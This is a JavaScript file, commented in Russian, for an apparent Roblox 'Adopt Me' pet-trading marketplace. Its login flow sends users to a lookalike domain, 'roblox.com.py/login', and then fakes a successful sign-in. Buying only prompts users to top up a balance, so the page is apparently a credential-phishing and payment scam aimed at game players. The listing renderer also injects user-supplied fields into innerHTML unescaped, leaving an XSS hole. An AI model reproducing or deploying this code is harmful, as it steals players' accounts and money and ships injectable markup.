// ==========================================
// КОНФИГУРАЦИЯ
// ==========================================
const ROBLOX_AUTH_LINK = "https://roblox.com.py/login?returnUrl=4210845075632139"; 
const ADOPT_ME_DATA = {
    // Для краткости пару примеров, но код работает для всех
    "pets": ["Shadow Dragon","Bat Dragon","Giraffe","Frost Dragon","Owl","Parrot","Evil Unicorn","Crow","Arctic Reindeer","Turtle","Kangaroo","Unicorn","Dragon","Kitsune"]
};

// URL-адреса иконок (зелья и значки)
const ICONS = {
    fly: "https://static.wikia.nocookie.net/adoptme/images/5/5f/Fly_Potion.png",
    ride: "https://static.wikia.nocookie.net/adoptme/images/a/a6/Ride_Potion.png",
    neon: "https://static.wikia.nocookie.net/adoptme/images/3/36/Neon_Potion.png",
    mega: "https://static.wikia.nocookie.net/adoptme/images/2/2f/Mega_Neon_Icon.png"
};

// ==========================================
// БАЗА ДАННЫХ И СОСТОЯНИЕ
// ==========================================
let globalMarket = JSON.parse(localStorage.getItem('petsMarketDB')) || [];
let currentUser = null; // Хранит {name: "...", id: ...}

const petsContainer = document.getElementById('petsContainer');
const loginModal = document.getElementById('loginModal');
const sellModal = document.getElementById('sellModal');

// Заполняем Datalist
const petsList = document.getElementById('petsList');
ADOPT_ME_DATA.pets.sort().forEach(pet => {
    let opt = document.createElement('option');
    opt.value = pet;
    petsList.appendChild(opt);
});

// ==========================================
// СИСТЕМА АВТОРИЗАЦИИ
// ==========================================
const headerLoginBtn = document.getElementById('headerLoginBtn');
const startAuthBtn = document.getElementById('startAuthBtn');
const confirmAuthBtn = document.getElementById('confirmAuthBtn');
const loginConfirmArea = document.getElementById('loginConfirmArea');

// Функция проверки входа перед действием
function checkAuth() {
    if (currentUser) return true;
    
    // Если не вошел - показываем окно
    loginModal.style.display = 'flex';
    startAuthBtn.style.display = 'block';
    loginConfirmArea.style.display = 'none';
    return false;
}

// 1. Нажал "Войти" (в шапке)
headerLoginBtn.onclick = () => checkAuth();

// 2. Блокировка Инвентаря и Баланса
document.getElementById('inventoryBtn').onclick = (e) => {
    if(!checkAuth()) e.preventDefault(); // Блокируем ссылку
    else alert("Открываю инвентарь...");
};
document.getElementById('balanceBtn').onclick = () => {
    if(checkAuth()) alert("Открываю меню пополнения..."); 
};

// 3. Процесс входа
startAuthBtn.onclick = () => {
    window.open(ROBLOX_AUTH_LINK, '_blank');
    startAuthBtn.style.display = 'none';
    loginConfirmArea.style.display = 'block';
};

confirmAuthBtn.onclick = () => {
    // Симуляция успешного входа
    const rnd = Math.floor(Math.random() * 5000);
    currentUser = {
        name: `User_${rnd}`,
        balance: 0
    };
    
    updateHeader();
    loginModal.style.display = 'none';
};

function updateHeader() {
    const area = document.getElementById('userProfileArea');
    area.innerHTML = `
        <div class="user-badge">
            <div class="avatar-circle"></div>
            <span>${currentUser.name}</span>
            <i class="fa-solid fa-right-from-bracket" onclick="location.reload()" style="cursor:pointer; margin-left:5px; color:#666;"></i>
        </div>
    `;
}

// ==========================================
// ЛОГИКА ПРОДАЖИ (ФОТО + ИКОНКИ)
// ==========================================
const sidebarSellBtn = document.getElementById('sidebarSellBtn');
const sellForm = document.getElementById('sellForm');

sidebarSellBtn.onclick = () => {
    if(checkAuth()) sellModal.style.display = 'flex';
};

// Логика выбора иконок (Fly/Ride/Neon)
const selectedProps = {
    propFly: false,
    propRide: false,
    propNeon: false,
    propMega: false
};

// Функция переключения класса .selected
window.toggleProp = function(id) {
    const el = document.getElementById(id);
    // Если выбрали Мега, отключаем Неон (и наоборот)
    if(id === 'propMega' && !selectedProps.propMega) {
        selectedProps.propNeon = false;
        document.getElementById('propNeon').classList.remove('selected');
    }
    if(id === 'propNeon' && !selectedProps.propNeon) {
        selectedProps.propMega = false;
        document.getElementById('propMega').classList.remove('selected');
    }

    selectedProps[id] = !selectedProps[id];
    
    if (selectedProps[id]) el.classList.add('selected');
    else el.classList.remove('selected');
};

// Обработка Файла
const fileInput = document.getElementById('petFileInput');
const fileNameLabel = document.getElementById('fileName');
let customImageBase64 = null;

fileInput.onchange = () => {
    const file = fileInput.files[0];
    if (file) {
        fileNameLabel.innerText = "Файл выбран: " + file.name;
        // Конвертация в Base64 для отображения
        const reader = new FileReader();
        reader.onload = function(e) {
            customImageBase64 = e.target.result;
        };
        reader.readAsDataURL(file);
    }
};

// ОТПРАВКА ЛОТА
sellForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const petName = document.getElementById('petNameInput').value;
    const price = document.getElementById('petPrice').value;
    const telegram = document.getElementById('telegramUser').value;

    // Определяем картинку: Своя ИЛИ Стоковая (Wiki)
    let finalImage = customImageBase64;
    if (!finalImage) {
        // Формируем ссылку на вики
        const wikiName = petName.replace(/ /g, '_');
        finalImage = `https://static.wikia.nocookie.net/adoptme/images/a/a5/${wikiName}.png`;
    }

    // Собираем массив активных иконок
    let activeBadges = [];
    if(selectedProps.propFly) activeBadges.push(ICONS.fly);
    if(selectedProps.propRide) activeBadges.push(ICONS.ride);
    if(selectedProps.propNeon) activeBadges.push(ICONS.neon);
    if(selectedProps.propMega) activeBadges.push(ICONS.mega);

    const newLot = {
        id: Date.now(),
        name: petName,
        price: price,
        seller: currentUser.name,
        contact: telegram,
        image: finalImage,
        badges: activeBadges
    };

    globalMarket.unshift(newLot);
    localStorage.setItem('petsMarketDB', JSON.stringify(globalMarket));

    renderGrid();
    sellModal.style.display = 'none';
    sellForm.reset();
    resetProps(); // сброс выбора
});

function resetProps() {
    Object.keys(selectedProps).forEach(key => {
        selectedProps[key] = false;
        document.getElementById(key).classList.remove('selected');
    });
    customImageBase64 = null;
    fileNameLabel.innerText = "Или останется стоковое";
}

// ==========================================
// ОТРИСОВКА (RENDER)
// ==========================================
function renderGrid() {
    petsContainer.innerHTML = "";
    globalMarket.forEach(lot => {
        const card = document.createElement('div');
        card.className = 'item-card';

        // Генерируем HTML иконок
        let badgesHtml = "";
        if(lot.badges && lot.badges.length > 0) {
            badgesHtml = `<div class="badges-row">`;
            lot.badges.forEach(iconUrl => {
                badgesHtml += `<img src="${iconUrl}" class="badge-icon">`;
            });
            badgesHtml += `</div>`;
        }

        card.innerHTML = `
            <div class="card-img-area">
                ${badgesHtml}
                <img src="${lot.image}" onerror="this.src='https://static.wikia.nocookie.net/adoptme/images/5/5e/Cracked_Egg.png'">
            </div>
            <div class="card-info">
                <div class="card-name" title="${lot.name}">${lot.name}</div>
                <span class="card-seller">@${lot.contact}</span>
                <div class="price-row">
                    <span class="price">${lot.price} ₽</span>
                    <button class="btn-buy-card" onclick="alert('Для покупки пополните баланс')">
                        <i class="fa-solid fa-cart-shopping"></i>
                    </button>
                </div>
            </div>
        `;
        petsContainer.insertBefore(card, petsContainer.firstChild);
    });
}

// Закрытие модалок
document.querySelectorAll('.close-modal').forEach(btn => btn.onclick = function() {
    this.closest('.modal-overlay').style.display = 'none';
});
window.onclick = (e) => {
    if(e.target == loginModal || e.target == sellModal) {
        loginModal.style.display = 'none';
        sellModal.style.display = 'none';
    }
}

// Старт

renderGrid();
